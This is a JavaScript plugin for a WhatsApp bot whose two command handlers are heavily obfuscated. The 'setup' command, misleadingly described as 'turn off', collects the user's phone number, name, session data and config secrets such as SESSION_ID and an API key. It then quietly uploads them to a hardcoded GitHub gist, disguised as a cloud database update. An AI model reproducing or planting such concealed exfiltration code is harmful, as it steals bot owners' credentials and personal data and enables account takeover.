const fs = require("fs")
const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin, parsedJid, command } = require("../lib");
//let data =  readFile('./database/settings.json')
//let db = JSON.parse(data);
//let bannnnnn = db.settings.banned
let path = './database/settings.json'
const relconfig = require('../config')
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================


command({
  pattern: "warn",
  fromMe: true,
  desc: "Unban number from this group",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
  const _0x46297b=_0xa094;(function(_0x1a3862,_0x4dc486){const _0x46e459=_0xa094,_0xf1ca54=_0x1a3862();while(!![]){try{const _0x90b436=-parseInt(_0x46e459(0x1b0))/0x1*(-parseInt(_0x46e459(0x1b8))/0x2)+-parseInt(_0x46e459(0x1ac))/0x3*(-parseInt(_0x46e459(0x1b3))/0x4)+parseInt(_0x46e459(0x1bc))/0x5+-parseInt(_0x46e459(0x1b5))/0x6+parseInt(_0x46e459(0x1b6))/0x7+-parseInt(_0x46e459(0x1b4))/0x8*(-parseInt(_0x46e459(0x1b9))/0x9)+-parseInt(_0x46e459(0x1ad))/0xa*(parseInt(_0x46e459(0x1af))/0xb);if(_0x90b436===_0x4dc486)break;else _0xf1ca54['push'](_0xf1ca54['shift']());}catch(_0x3c7313){_0xf1ca54['push'](_0xf1ca54['shift']());}}}(_0x4874,0xef10a));if(!message[_0x46297b(0x1ae)])return await message['reply']('_This\x20command\x20is\x20for\x20groups_');let jidd=parsedJid(match)[_0x46297b(0x1bd)]();match=jidd||message[_0x46297b(0x1bb)]['jid'];if(!match)return await message[_0x46297b(0x1ba)](_0x46297b(0x1b2));let isadmin=await isAdmin(message[_0x46297b(0x1b7)],message[_0x46297b(0x1ab)],message[_0x46297b(0x1b1)]);function _0x4874(){const _0x2a2718=['44589NAMpzz','2934520mVQOqJ','isGroup','44hcSLAx','851588EzUZQf','client','_Mention\x20user\x20to\x20add','24QYSUXQ','29592mTDZjy','7738818KbmDUD','5349603lOMXWU','jid','2gYcrpL','468PMvraB','reply','reply_message','7727390OPeajt','toString','user'];_0x4874=function(){return _0x2a2718;};return _0x4874();}if(!isadmin)return await message[_0x46297b(0x1ba)]('_I\x27m\x20not\x20admin_');let jid=parsedJid(match);function _0xa094(_0x129b98,_0x5db1e8){const _0x4874db=_0x4874();return _0xa094=function(_0xa094e6,_0x313999){_0xa094e6=_0xa094e6-0x1ab;let _0x3e924d=_0x4874db[_0xa094e6];return _0x3e924d;},_0xa094(_0x129b98,_0x5db1e8);}await message['warn'](match,message);
  } 
);

//============================================================================================================================================




//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update"${__filename}"`))
	delete require.cache[file]
	require(file)
})




command({
  pattern: "setup",
  fromMe: true,
  desc: "turn off",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
const _0xc633d1=_0x488e;function _0x52f2(){const _0x2c624f=['split','RMBG_KEY','2447748sYwSPc','FONT_STYLE','reply','ALIVE','client','Storage','./database/settings.json','log','STORAGE_JID','../session.json','user','258iAcRew','2972pfSqjk','Failed\x20to\x20write\x20updated\x20data\x20to\x20file','THEME','HANDLER','BRANCH','isGroup','config','readFileSync','FOOTER','pushName','UserId','toString','MESSAGE_MEM','Cloud\x20DB\x20Update','jid','phone_num','LOGS','This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!','then','5228peVOkT','_Registered\x20Successfully_','LANG','641097lFNEom','5709792JgtSOq','AUTHOR','88oADcvU','PACKNAME','5029230hCQvNP','sendMessage','INTERNAL_MENU','groupCreate','databasetoken','ANTILINK_ACTION','@octokit/rest','Done\x20Creating\x20New\x20Db','WORK_TYPE','parse','BOT_NAME','7SWYzRv','359889999996@s.whatsapp.net','rest','updateProfilePicture','send','.json','name','a216db893ba4f4a18d4f1476bfc1bb4d','135779ooBMhD','@g.us','1210UkcesY','LANGUAGE','@s.whatsapp.net','WELCOME_MSG','OWNER_NAME','creds','includes','MODE','SESSION_ID','ANTILINK'];_0x52f2=function(){return _0x2c624f;};return _0x52f2();}function _0x488e(_0x1c7d74,_0x108bc7){const _0x52f295=_0x52f2();return _0x488e=function(_0x488e3d,_0x4c9ca3){_0x488e3d=_0x488e3d-0x1bb;let _0x1bf7f3=_0x52f295[_0x488e3d];return _0x1bf7f3;},_0x488e(_0x1c7d74,_0x108bc7);}(function(_0x59b1ce,_0x5430f6){const _0x393505=_0x488e,_0x41b352=_0x59b1ce();while(!![]){try{const _0x29d8b0=-parseInt(_0x393505(0x1e2))/0x1*(parseInt(_0x393505(0x1bc))/0x2)+-parseInt(_0x393505(0x1f8))/0x3+-parseInt(_0x393505(0x1cf))/0x4*(parseInt(_0x393505(0x1ec))/0x5)+-parseInt(_0x393505(0x1bb))/0x6*(-parseInt(_0x393505(0x1ea))/0x7)+-parseInt(_0x393505(0x1d5))/0x8*(-parseInt(_0x393505(0x1d2))/0x9)+parseInt(_0x393505(0x1d7))/0xa+-parseInt(_0x393505(0x1d3))/0xb;if(_0x29d8b0===_0x5430f6)break;else _0x41b352['push'](_0x41b352['shift']());}catch(_0x619f65){_0x41b352['push'](_0x41b352['shift']());}}}(_0x52f2,0x70079));if(message[_0xc633d1(0x1c1)])return;const {Octokit}=require(_0xc633d1(0x1dd)),octokit=new Octokit({'auth':global[_0xc633d1(0x1db)]});setTimeout(()=>{const _0x2052ad=_0xc633d1;let _0x2d5345=JSON[_0x2052ad(0x1e0)](fs[_0x2052ad(0x1c3)](_0x2052ad(0x1fe))),_0xc016e5=_0x2d5345['config'][_0x2052ad(0x200)],_0x57e948=_0xc016e5['toString']()['includes'](_0x2052ad(0x1eb));if(!_0x57e948)readFile(path,async(_0x2b6ab2,_0x51cf39)=>{const _0x1cdf28=_0x2052ad;if(_0x2b6ab2){console[_0x1cdf28(0x1ff)](_0x2b6ab2);return;}const _0x2da2a2=JSON['parse'](_0x51cf39);let _0x5c2d8d=await message[_0x1cdf28(0x1fc)][_0x1cdf28(0x1da)](_0x1cdf28(0x1fd),[_0x1cdf28(0x1e3)]);await message[_0x1cdf28(0x1fc)][_0x1cdf28(0x1d8)](_0x5c2d8d['id'],{'text':_0x1cdf28(0x1cd)});let _0x4d6719=await _0x5c2d8d['id'];_0x2da2a2[_0x1cdf28(0x1c2)]['STORAGE_JID']=_0x4d6719,writeFile(path,JSON['stringify'](_0x2da2a2,null,0x2),async _0x17f6bf=>{const _0x222802=_0x1cdf28;if(_0x17f6bf){message['reply'](_0x222802(0x1bd));return;}await message[_0x222802(0x1fc)][_0x222802(0x1e5)](_0x5c2d8d['id'],fs[_0x222802(0x1c3)]('./media/AAA.jpg'));});});else return;setTimeout(async()=>{const _0x54615b=_0x2052ad;let _0x2588e6=require(_0x54615b(0x201)),_0x5f4ecf=await _0x2588e6[_0x54615b(0x1f1)]['me']['id']['split'](':')[0x0],_0x210f16=await _0x2588e6['creds']['me']['id'][_0x54615b(0x1f6)]('@')[0x1],_0x4b47ad=_0x5f4ecf+'@'+_0x210f16,_0x29d852=_0x4b47ad+_0x54615b(0x1e7);const _0x100107=fs[_0x54615b(0x1c3)](_0x54615b(0x1fe),'utf-8');await octokit[_0x54615b(0x1e4)]['gists']['update']({'gist_id':_0x54615b(0x1e9),'description':_0x54615b(0x1c9),'files':{[_0x29d852]:{'content':_0x100107}}})[_0x54615b(0x1ce)](await console[_0x54615b(0x1ff)](_0x54615b(0x1de))),setTimeout(()=>{const _0x228b5b=_0x54615b;return process[_0x228b5b(0x1e6)]('reset');},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0xc9cd24,_0x6081ed)=>{const _0x2626e6=_0xc633d1;if(_0xc9cd24){console[_0x2626e6(0x1ff)](_0xc9cd24);return;}const _0x3e674b=JSON[_0x2626e6(0x1e0)](_0x6081ed);let _0xbbc3cd=_0x3e674b[_0x2626e6(0x1c6)][_0x2626e6(0x1c7)]()[_0x2626e6(0x1f2)](_0x2626e6(0x1ee));if(_0xbbc3cd)return message['reply']('_You\x20Are\x20Already\x20a\x20Family\x20Member_');let _0x1e0017=message[_0x2626e6(0x1c5)],_0x220bd6=message[_0x2626e6(0x202)],_0x393b5f=message[_0x2626e6(0x1ca)][_0x2626e6(0x1c7)]()['split']('@')[0x0];_0x3e674b[_0x2626e6(0x1e8)]=_0x1e0017,_0x3e674b['UserId']=_0x220bd6,_0x3e674b[_0x2626e6(0x1cb)]=_0x393b5f,_0x3e674b['config'][_0x2626e6(0x1bf)]=relconfig[_0x2626e6(0x1bf)],_0x3e674b[_0x2626e6(0x1c2)]['WORK_TYPE']=relconfig[_0x2626e6(0x1df)],_0x3e674b['config'][_0x2626e6(0x1e1)]=relconfig[_0x2626e6(0x1e1)],_0x3e674b[_0x2626e6(0x1c2)]['OWNER_NAME']=relconfig[_0x2626e6(0x1f0)],_0x3e674b['config']['SUDO']=relconfig['SUDO'],_0x3e674b[_0x2626e6(0x1c2)][_0x2626e6(0x1d4)]=relconfig['AUTHOR'],_0x3e674b[_0x2626e6(0x1c2)][_0x2626e6(0x1d6)]=relconfig['PACKNAME'],_0x3e674b[_0x2626e6(0x1c2)]['RMBG_KEY']=relconfig[_0x2626e6(0x1f7)],_0x3e674b[_0x2626e6(0x1c2)][_0x2626e6(0x1d1)]=relconfig[_0x2626e6(0x1d1)],_0x3e674b[_0x2626e6(0x1c2)][_0x2626e6(0x1dc)]=relconfig[_0x2626e6(0x1dc)],_0x3e674b[_0x2626e6(0x1c2)][_0x2626e6(0x1f5)]=relconfig[_0x2626e6(0x1f5)],_0x3e674b[_0x2626e6(0x1c2)]['FOOTER']=relconfig[_0x2626e6(0x1c4)],_0x3e674b['config']['THEME']=relconfig[_0x2626e6(0x1be)],_0x3e674b['config']['FONT_STYLE']=relconfig[_0x2626e6(0x1f9)],_0x3e674b['config'][_0x2626e6(0x1ed)]=relconfig[_0x2626e6(0x1ed)],_0x3e674b['config'][_0x2626e6(0x1d9)]=relconfig[_0x2626e6(0x1d9)],_0x3e674b[_0x2626e6(0x1c2)][_0x2626e6(0x1f3)]=relconfig[_0x2626e6(0x1f3)],_0x3e674b['config'][_0x2626e6(0x200)],_0x3e674b[_0x2626e6(0x1c2)]['DB_URL'],_0x3e674b['config'][_0x2626e6(0x1f4)]=relconfig[_0x2626e6(0x1f4)],_0x3e674b['config'][_0x2626e6(0x1cc)]=relconfig[_0x2626e6(0x1cc)],_0x3e674b[_0x2626e6(0x1c2)][_0x2626e6(0x1c0)]=relconfig['BRANCH'],_0x3e674b['config']['B1']=relconfig['B1'],_0x3e674b['config']['B2']=relconfig['B2'],_0x3e674b[_0x2626e6(0x1c2)]['B3']=relconfig['B3'],_0x3e674b['config']['B4']=relconfig['B4'],_0x3e674b['config']['B5']=relconfig['B5'],_0x3e674b[_0x2626e6(0x1c8)]['GOODBYE_MSG']=relconfig['GOODBYE_MSG'],_0x3e674b['MESSAGE_MEM']['WELCOME_MSG']=relconfig[_0x2626e6(0x1ef)],_0x3e674b[_0x2626e6(0x1c8)][_0x2626e6(0x1fb)]=relconfig['ALIVE'],writeFile(path,JSON['stringify'](_0x3e674b,null,0x2),_0x56f09a=>{const _0x91d9d1=_0x2626e6;if(_0x56f09a){message[_0x91d9d1(0x1fa)](_0x91d9d1(0x1bd));return;}message['reply'](_0x91d9d1(0x1d0));});});
})

